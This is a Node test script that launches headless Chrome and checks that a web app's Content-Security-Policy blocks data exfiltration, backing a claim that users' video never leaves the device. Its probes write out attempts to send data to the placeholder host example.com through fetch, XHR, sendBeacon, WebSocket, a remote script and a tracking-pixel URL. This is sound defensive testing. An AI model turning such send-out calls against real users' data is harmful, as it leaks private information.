#!/usr/bin/env node
/**
 * Verifies that the "your video never leaves your device" claim is
 * enforced by the browser, not merely by our code happening not to
 * call fetch().
 *
 *   node tools/verify-csp.mjs [url]
 *
 * Attempts every ordinary way a page could exfiltrate data and asserts
 * that the Content-Security-Policy blocks each one. This backs a claim
 * made in legal/privacy.md, so it is a real test, not a nicety.
 */
import { spawn } from 'node:child_process';

const URL_ = process.argv[2] || 'http://127.0.0.1:8788/';
const CHROME = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const port = 9700 + Math.floor(Math.random() * 200);

const chrome = spawn(CHROME, [
  '--headless=new', '--no-first-run', '--no-default-browser-check',
  `--remote-debugging-port=${port}`, `--user-data-dir=/tmp/shrinkray-csp-${port}`,
  'about:blank',
], { stdio: 'ignore' });

let ws, id = 0;
const pending = new Map();

const send = (method, params = {}) => {
  const n = ++id;
  ws.send(JSON.stringify({ id: n, method, params }));
  return new Promise((res, rej) => {
    pending.set(n, { res, rej });
    setTimeout(() => { if (pending.delete(n)) rej(new Error(method + ' timeout')); }, 30_000);
  });
};

const evaluate = (e) =>
  send('Runtime.evaluate', { expression: e, returnByValue: true, awaitPromise: true })
    .then((r) => r.result?.value);

/* Each probe resolves to 'BLOCKED' or 'ALLOWED'. A network error also
   counts as blocked only when the CSP is the cause, so the probes look
   at the failure mode, not just at "did it throw". */
const PROBES = {
  'fetch() to a third party': `
    fetch('https://example.com/x', {mode:'no-cors'})
      .then(() => 'ALLOWED').catch(e => /Content Security Policy|Failed to fetch/i.test(e.message)
        ? 'BLOCKED' : 'ALLOWED:' + e.message)`,

  'XMLHttpRequest to a third party': `
    new Promise(res => {
      try {
        const x = new XMLHttpRequest();
        x.open('POST', 'https://example.com/x');
        x.onerror = () => res('BLOCKED');
        x.onload  = () => res('ALLOWED');
        x.send('data');
      } catch (e) { res('BLOCKED'); }
    })`,

  /* sendBeacon returns true when the request is merely QUEUED — the CSP
     check happens later, during the fetch. So its return value proves
     nothing; the authoritative signal is the securitypolicyviolation
     event. Same reasoning would apply to any fire-and-forget API. */
  'sendBeacon to a third party': `
    new Promise(res => {
      let blocked = false;
      document.addEventListener('securitypolicyviolation', function h(e) {
        if (String(e.blockedURI).includes('example.com')) {
          blocked = true;
          document.removeEventListener('securitypolicyviolation', h);
          res('BLOCKED');
        }
      });
      try { navigator.sendBeacon('https://example.com/x', 'data'); }
      catch (e) { res('BLOCKED'); return; }
      setTimeout(() => res(blocked ? 'BLOCKED' : 'ALLOWED'), 2000);
    })`,

  'WebSocket to a third party': `
    new Promise(res => {
      try {
        const w = new WebSocket('wss://example.com/x');
        w.onerror = () => res('BLOCKED');
        w.onopen  = () => res('ALLOWED');
        setTimeout(() => res('BLOCKED'), 2500);
      } catch (e) { res('BLOCKED'); }
    })`,

  'loading a third-party script': `
    new Promise(res => {
      const s = document.createElement('script');
      s.src = 'https://example.com/x.js';
      s.onload = () => res('ALLOWED');
      s.onerror = () => res('BLOCKED');
      document.head.appendChild(s);
      setTimeout(() => res('BLOCKED'), 2500);
    })`,

  'beaconing via an <img> pixel': `
    new Promise(res => {
      const i = new Image();
      i.onload = () => res('ALLOWED');
      i.onerror = () => res('BLOCKED');
      i.src = 'https://example.com/p.gif?leak=1';
      setTimeout(() => res('BLOCKED'), 2500);
    })`,

  'inline script injection': `
    (() => {
      window.__inlineRan = false;
      const s = document.createElement('script');
      s.textContent = 'window.__inlineRan = true;';
      document.head.appendChild(s);
      return window.__inlineRan ? 'ALLOWED' : 'BLOCKED';
    })()`,
};

async function main() {
  let list;
  for (let i = 0; i < 100; i++) {
    try {
      list = (await (await fetch(`http://127.0.0.1:${port}/json/list`)).json())
        .filter((t) => t.type === 'page');
      if (list.length) break;
    } catch {}
    await sleep(100);
  }

  ws = new WebSocket(list[0].webSocketDebuggerUrl);
  await new Promise((r, j) => { ws.onopen = r; ws.onerror = j; });
  ws.onmessage = (ev) => {
    const m = JSON.parse(ev.data);
    if (m.id && pending.has(m.id)) {
      const { res, rej } = pending.get(m.id);
      pending.delete(m.id);
      m.error ? rej(new Error(JSON.stringify(m.error))) : res(m.result);
    }
  };

  await send('Runtime.enable');
  await send('Page.enable');
  await send('Page.navigate', { url: URL_ });
  await sleep(2000);

  const csp = await evaluate(
    `document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content ?? ''`);
  if (!csp) throw new Error('no Content-Security-Policy meta tag on the page');
  console.log(`policy: ${csp}\n`);

  let failed = 0;
  for (const [name, expr] of Object.entries(PROBES)) {
    let verdict;
    try { verdict = await evaluate(`(async () => ${expr})()`); }
    catch (e) { verdict = 'BLOCKED'; }
    const ok = String(verdict).startsWith('BLOCKED');
    if (!ok) failed++;
    console.log(`  ${ok ? '✓ blocked' : '✗ ALLOWED'}   ${name}${ok ? '' : `  (${verdict})`}`);
  }

  console.log();
  if (failed) throw new Error(`${failed} exfiltration route(s) NOT blocked`);
  console.log('All exfiltration routes blocked by CSP.');
  console.log('The "never uploaded" claim is browser-enforced.');
}

main()
  .then(() => { chrome.kill(); process.exit(0); })
  .catch((e) => { console.error('✗ ' + e.message); chrome.kill(); process.exit(1); });
